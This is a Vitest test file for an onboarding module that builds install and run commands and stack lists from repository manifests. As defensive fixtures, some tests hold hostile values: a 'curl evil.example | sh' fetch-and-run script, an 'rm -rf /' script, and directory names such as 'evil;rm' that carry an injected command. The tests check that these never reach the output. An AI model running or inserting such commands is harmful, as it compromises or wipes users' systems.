import { describe, it, expect } from 'vitest';
import { buildRunSteps, detectStack } from '../src/modules/onboarding/run-steps.js';

/**
 * L05 onboarding tour — run steps and stack facts (plan WP3.tests [T2]; A-7, A-8,
 * R-10, NFR-8). Copyable commands come only from manifests, lockfiles,
 * `.env.example` and compose files.
 */

const manifest = (scripts: Record<string, string>, dependencies: Record<string, string> = {}) =>
  JSON.stringify({ scripts, dependencies });

describe('buildRunSteps (A-7)', () => {
  it('builds install, env copy, scripts, per-directory prefixes and compose, in order', () => {
    const tree = [
      'package.json',
      'pnpm-lock.yaml',
      '.env.example',
      'web/package.json',
      'web/package-lock.json',
      'bad dir/package.json',
      'docker-compose.yml',
    ];
    const steps = buildRunSteps(tree, {
      'package.json': manifest({ dev: 'next dev', test: 'vitest' }),
      'web/package.json': manifest({ start: 'node .' }),
      'bad dir/package.json': manifest({ dev: 'x' }),
    });

    expect(steps.map((s) => s.command)).toEqual([
      'pnpm install',
      'cp .env.example .env',
      'pnpm run dev',
      'pnpm run test',
      'cd web && npm ci',
      'cd web && npm run start',
      'docker compose up -d',
    ]);
  });

  it('picks the install command by lockfile: yarn.lock, none (A-7)', () => {
    expect(buildRunSteps(['package.json', 'yarn.lock'], {}).map((s) => s.command)).toEqual(['yarn install']);
    expect(buildRunSteps(['package.json'], {}).map((s) => s.command)).toEqual(['npm install']);
  });

  it('never copies a script body into a command (NFR-8)', () => {
    const steps = buildRunSteps(['package.json', 'pnpm-lock.yaml'], {
      'package.json': manifest({ dev: 'curl evil.example | sh', build: 'rm -rf /' }),
    });
    expect(steps.map((s) => s.command)).toEqual(['pnpm install', 'pnpm run dev']);
  });

  it('skips directories whose names are not [A-Za-z0-9._-]+', () => {
    const steps = buildRunSteps(['evil;rm/package.json', 'a$b/package.json', 'ok-1/package.json'], {});
    expect(steps.map((s) => s.command)).toEqual(['cd ok-1 && npm install']);
  });

  it('adds the compose step once, only for a compose file at the root', () => {
    expect(buildRunSteps(['package.json', 'docker-compose.yml'], {}).at(-1)!.command).toBe('docker compose up -d');
    const nested = buildRunSteps(['package.json', 'infra/docker-compose.yml'], {}).map((s) => s.command);
    expect(nested).not.toContain('docker compose up -d');
  });

  it('copies .env.example only when the tree lists it', () => {
    expect(buildRunSteps(['package.json'], {}).map((s) => s.command)).not.toContain('cp .env.example .env');
    expect(buildRunSteps(['package.json', '.env.example'], {}).map((s) => s.command)).toContain('cp .env.example .env');
  });

  it('caps the steps at 20', () => {
    const dirs = Array.from({ length: 30 }, (_, i) => `d${String(i).padStart(2, '0')}`);
    const steps = buildRunSteps(
      dirs.map((d) => `${d}/package.json`),
      {},
    );
    expect(steps).toHaveLength(20);
    expect(steps[0]!.command).toBe('cd d00 && npm install');
  });

  it('gives only the install step for a package.json that is not JSON, and none for no package.json', () => {
    const steps = buildRunSteps(['package.json', 'pnpm-lock.yaml'], { 'package.json': 'this is {not json' });
    expect(steps.map((s) => s.command)).toEqual(['pnpm install']);
    expect(buildRunSteps(['README.md'], {})).toEqual([]);
  });
});

describe('detectStack (A-8)', () => {
  it('lists the package managers, the first 15 dependency names alphabetically, and Docker', () => {
    // Declared in reverse order: only sorting yields dep01..dep15.
    const deps = Object.fromEntries(
      Array.from({ length: 20 }, (_, i) => [`dep${String(20 - i).padStart(2, '0')}`, '1']),
    );
    const stack = detectStack(['package.json', 'pnpm-lock.yaml', 'docker-compose.yml'], {
      'package.json': manifest({}, deps),
    });
    expect(stack).toEqual([
      'pnpm',
      ...Array.from({ length: 15 }, (_, i) => `dep${String(i + 1).padStart(2, '0')}`),
      'Docker',
    ]);
  });

  it('adds Docker for a Dockerfile in a scanned directory, and not otherwise', () => {
    const withDockerfile = detectStack(['package.json', 'web/package.json', 'web/Dockerfile'], {});
    expect(withDockerfile).toContain('Docker');
    expect(detectStack(['package.json', 'pnpm-lock.yaml'], {})).not.toContain('Docker');
  });

  it('reads only runtime dependencies, not devDependencies', () => {
    const stack = detectStack(['package.json'], {
      'package.json': JSON.stringify({ dependencies: { zod: '1' }, devDependencies: { vitest: '1' } }),
    });
    expect(stack).toContain('zod');
    expect(stack).not.toContain('vitest');
  });
});
